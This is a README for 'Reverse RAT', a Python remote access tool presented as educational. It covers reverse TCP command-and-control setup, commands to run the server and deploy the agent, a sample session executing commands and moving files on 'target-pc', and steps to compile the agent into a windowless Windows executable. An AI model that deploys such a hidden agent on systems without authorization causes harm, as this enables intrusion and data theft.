Markdown
# Reverse RAT — Remote Administration Tool

A lightweight, ethical, and educational Remote Administration Tool (RAT) built entirely using Python's standard library. Designed for lab testing, systems administration demonstrations, and network security learning in authorized environments.

---

## 🌟 Key Features

- **Reverse TCP Architecture:** Bypasses inbound firewall restrictions by initiating outbound connections from client to server.
- **Cross-Platform Compatibility:** Runs seamlessly on Linux, macOS, and Windows.
- **No External Dependencies:** Written in standard Python 3.8+ with no need for third-party `pip` packages.
- **Dual Management Interfaces:** Choice of an interactive **CLI Console** or a modern **Tkinter Graphical User Interface (GUI)**.
- **Token Authentication:** Ensures only authorized agents with a pre-shared token can connect to the C2 server.
- **Preset Quick Commands:** One-click execution for common system commands (`whoami`, `ipconfig`, `systeminfo`, `netstat`, etc.).
- **File Transfer Protocols:** Integrated file upload and download capabilities.
- **Screen Capture Support:** Remote screenshot collection (where local OS utilities are available).
- **Auto-Session Tracking:** Keeps active sessions synchronized in real-time without losing user selection.

---

## 📸 Screenshots


---

## 📋 Requirements

- **Python:** Version 3.8 or higher.
- **GUI Dependency:** `python3-tk` (required only if running `gui.py` on Linux).
  
  *Installation on Debian/Ubuntu:*
  ```bash
  sudo apt update && sudo apt install -y python3-tk
🚀 Quick Start Guide
1. Project Setup
Clone or create your project directory and navigate into it:

Bash
mkdir reverse-rat
cd reverse-rat
# Place server.py, client.py, gui.py, and protocols.py in this folder
2. Running the C2 Controller (Server)
You can manage connections using either the GUI (recommended) or the CLI.

Option A: Graphical User Interface (GUI)
Launch the controller:

Bash
python3 gui.py
Set the Host (0.0.0.0 to listen on all interfaces), Port (4444), and your secret Token.

Click Start Server.

Select an active session from the list when an agent connects.

Use the Quick Commands buttons or type manual commands in the input field.

Option B: Command-Line Interface (CLI)
Run the standalone server:

Bash
python3 server.py --host 0.0.0.0 --port 4444 --token Sup3rSecret
3. Deploying the Agent (Client)
Run client.py on the machine you are administering.

Bash
python3 client.py --host <SERVER_IP> --port 4444 --token Sup3rSecret
Note on Networking:

Same Local Network (LAN): Use the server's local IP address (e.g., 192.168.1.100).

Over the Internet: Use your router's Public IP address (requires TCP Port 4444 forwarded to the server) or deploy server.py on a Cloud VPS.

VPN Netmesh: Works out-of-the-box using Tailscale IP addresses.

🛠️ Compiling to Executable (.exe) for Windows
To package client.py into a standalone .exe file that runs without a Python installation on Windows, use PyInstaller:

DOS
pip install pyinstaller
pyinstaller --onefile --noconsole client.py
The compiled executable will be located in the dist/ directory as client.exe.

💻 CLI Usage Example
When managing sessions via the CLI interface:

Plaintext
[+] Session 1 connected from 192.168.1.50:52134 (hostname: target-pc)

Select session id: 1
session-1> exec whoami
desktop-target\user

session-1> exec ipconfig /all
Windows IP Configuration ...

session-1> upload ./config.bin C:\temp\config.bin
[+] Uploaded 2048 bytes to C:\temp\config.bin

session-1> download C:\temp\logs.txt ./logs.txt
[+] Downloaded C:\temp\logs.txt successfully

session-1> exit
📁 Repository Structure
Plaintext
reverse-rat/
├── server.py       # Core C2 TCP listener and session manager
├── gui.py          # Tkinter Graphical User Interface for C2 controller
├── client.py        # Remote agent script executed on target machine
├── protocols.py     # Shared JSON network messaging and framing library
└── README.md        # Documentation
⚖️ Legal & Ethical Disclaimer
This software is created exclusively for authorized educational purposes, security research, and system administration testing within isolated environments.

Unauthorized deployment against systems you do not own or do not have explicit written permission to test is illegal and strictly prohibited. The developer assumes no liability for misuse or damage caused by this program.
